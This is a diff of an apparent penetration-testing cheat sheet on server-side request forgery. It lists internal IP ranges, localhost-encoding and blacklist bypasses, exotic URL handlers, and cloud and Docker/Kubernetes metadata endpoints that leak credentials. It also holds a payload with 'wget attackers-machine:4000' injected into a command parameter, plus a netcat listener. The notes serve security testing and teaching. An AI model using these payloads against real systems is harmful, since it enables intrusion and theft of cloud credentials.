@@ -4,24 +4,46 @@ description: Server Side Request Forgery
 
 # SSRF
 
-Comes in many forms, each time it appears is almost a unique occurence, dependent on the site's functionality and implementation.  SSRF unintentionally gives the user the ability to do something and appear as though it is the server making that request.  If you have control over a URL parameter and it isn't a redirect, you should test for SSRF.  Some more common occurences are making requests to an API \(internal or external\), exposing their internal network through port scans or accessing files on their local networks. 
+SSRF comes in many forms, each time I read a report is like its own unique occurrence, dependent on the web app's functionality and implementation.  SSRF  gives the user the ability to do something, though it  unintentionally gives the attacker the ability to make the request on behalf of the server. 
 
-Take a look at out-of-band mechanisms `(ssrftest.com)` and burp's collaborater.  Set up a netcat lister via `nc -l -n -vv -p 8080 -k`
+**PLACES TO FIND SSRF**
 
-If you receive an error message back, check to see if there's a way to tell the difference between open and closed ports. If not, maybe the amount of time it takes to get a response may give you a hint \(burp's Intruder is built for this\). 
+Perhaps most commonly, SSRF can be found via any parameter that  appears to be doing something as the server, such as fetching a website's content with a `url=` parameter \(especially if it's not used as a redirect\).  Some other places to find it are situations where a server makes requests to an API, some port or service on its internal network or fetches a file not normally exposed to the public internet.
 
-Often this only works with certain ports, so test 80, 443, 8080, 8443, 8001, etc..
+**Quick SSRF tests and attacks**
 
-If you have an endpoint that appends a path to your payload, try adding a & or a \# to the end of your payload like so:
+Scan internal systems:  
+`10.0.0.0/8   
+127.0.0.1/32   
+172.16.0.0/12   
+192.168.0.0/16`  
+  
+**Reflected XSS:**  
+Once you find an endpoint that is fetching an internal file, you can attempt to pull an external file to get a reflected XSS.  
+`http://vulnsite/?url=http://brutelogic.com.br/poc.svg`  
+  
+**File upload services:**   
+instead of uploading a file, try sending a URL and see if it downloads the content of your payload.
+
+**ON FINDING INTERNAL PORTS**
+
+If you receive an error message back, check to see if there's a way to tell the difference between open and closed ports. If the result is not completely obvious, look into subtler methods to find differences.  
+
+For example, differences in response times may give you a hint, done very easily with Burp's intruder.  You can compare the amount of time it takes between a port that you are confident is open and contrast it - or just scan all 65,535 like a raging juggernaut \(as 99% of them will not be open, it should be pretty clear at this point\).  Though I'd recommend primarily scanning the ports most likely to be open, such as _80, 443, 8080, 8443, 8001, 22, etc.._
+
+SMUGGLING FORGED REQUESTS UNDER THE WAF's NOSE
+
+There are many tricks to try to bypass a web app's blacklists, whitelists, WAFs and IDSs, and many more continue to be developed through research such as Orange Tsai's and Nahamsec's, as well as many new vulnerable technologies creating new opportunities as well.
+
+*  If you have an endpoint that appends a path to your payload, try adding a & or a \# to the end of your payload like so:
 
 [`http://internal-vulnerable-server/rce?cmd=wget attackers-machine:4000&`](http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000&)[`http://internal-vulnerable-server/rce?cmd=wget attackers-machine:4000#`](http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000#)
 
-If there's a parser looking for a specific IP address, try decimal IP notation.
+* Take a look into a web app's PDF generators, document parsers and file uploads, as SSRF may occur there.  You can simplify the confirmation of the vulnerability without exposing your private IP by using burp collaborator or online webhooks \(https://webhook.site\).  
 
-Take a look into a web app's PDF generators, document parsers and file uploads, as SSRF may occur there.  You can simplify the confirmation of the vulnerability without exposing your private IP by using webhooks \(webhook.site\).  
+**Masking your internal requests**
 
-**Port scanning internal assets**  
-
+Usually, requests to expose "localhost" and "127.0.0.1" are blacklisted.  Here's some bypasses, many of which can be combined to expand this list further.
 
 ```text
 http://0177.1/
@@ -41,7 +63,10 @@ https://520968996
 
 _Note:_ The latter can be calculated using [http://www.subnetmask.info/](http://www.subnetmask.info/)
 
-**Exotic Handlers**
+**Exotic Handlers**  
+to bypass restrictions on "file://"
+
+![Basic attempts such as above will likely be slapped down](../.gitbook/assets/image%20%2816%29.png)
 
 ```text
 gopher://, dict://, php://, jar://, tftp://
@@ -94,13 +119,21 @@ http://169.254.169.254/latest/meta-data/public-hostname
 
 > If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role \[...\]
 
-_Link:_ [http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) \(includes a comprehensive Instance Metadata Categories table\)
+_Link:_ [http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) \(includes a comprehensive Instance Metadata Categories table\)  
 
-Create index.php with the following:
 
-&lt;?php header\("location: [http://burp.collab.server](http://burp.collab.server)"\); ?&gt; 
+**Other services:**
 
-Host it \(but be careful in doing this as it does introduce a security vulnerability on the system you're on\): `sudo php -S :80 -t`  Specify your host for the target site in the vulnerable application
+★ Alibaba: [http://100.100.100.200/latest/meta-data/](http://100.100.100.200/latest/meta-data/)  
+★ Docker - containers: [http://127.0.0.1:2375/v1.24/containers/json](http://127.0.0.1:2375/v1.24/containers/json)   
+★ Kubernetes ETCD - contains API keys, internal ip and ports: [http://127.0.0.1:2379/v2/keys/?recursive=true](http://127.0.0.1:2379/v2/keys/?recursive=true)   
+★ Google Cloud: [http://169.254.169.254/computeMetadata/v1/](http://169.254.169.254/computeMetadata/v1/)   
+★ Digital Ocean: [http://169.254.169.254/metadata/v1.json](http://169.254.169.254/metadata/v1.json)   
+★ Packetcloud: [https://metadata.packet.net/userdata](https://metadata.packet.net/userdata)   
+★ Oracle Cloud: [http://192.0.0.192/latest/](http://192.0.0.192/latest/) 
+
+**Whitelists**  
+If dealing with a whitelist blocking your every attempt, the only way \(that I know of\) finding a bypass and making it appear as though the request is truly coming from within, is to find an open redirect from elsewhere in the webapp and diverting the request through it.
 
 This has a great write-up on SOP and CORS, as well as SSRF: _https://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/_ 
 
